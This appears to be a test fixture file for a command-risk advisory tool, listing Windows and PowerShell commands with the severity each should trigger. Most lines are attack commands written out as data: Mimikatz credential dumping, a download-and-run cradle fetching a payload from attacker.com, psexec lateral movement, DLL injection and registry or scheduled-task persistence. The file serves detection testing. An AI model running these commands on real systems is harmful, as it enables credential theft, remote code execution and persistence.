# Empire Advisor Test Fixtures
# One command per line for acceptance testing

# Critical severity - should trigger block advisory
Invoke-Mimikatz -DumpCreds
mimikatz sekurlsa::logonpasswords
SharpHound.exe -CollectionMethod All

# High severity - should trigger warn advisory
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
psexec \\target01 cmd.exe /c "whoami"
Invoke-DllInjection -ProcessID 1234 -Dll payload.dll
schtasks /create /tn UpdateTask /tr "powershell.exe -File C:\update.ps1" /sc onlogon

# Medium severity - should trigger warn or allow with info
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami"
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "C:\update.exe"
Invoke-Expression (Get-Content C:\payload.ps1)
net group "Domain Admins" /domain

# Low severity - should allow with low risk
Test-NetConnection -ComputerName 192.168.1.1 -Port 445

# Clean command - should allow with minimal risk
Get-Process | Where-Object {$_.CPU -gt 100}
Get-Service | Select-Object Name,Status
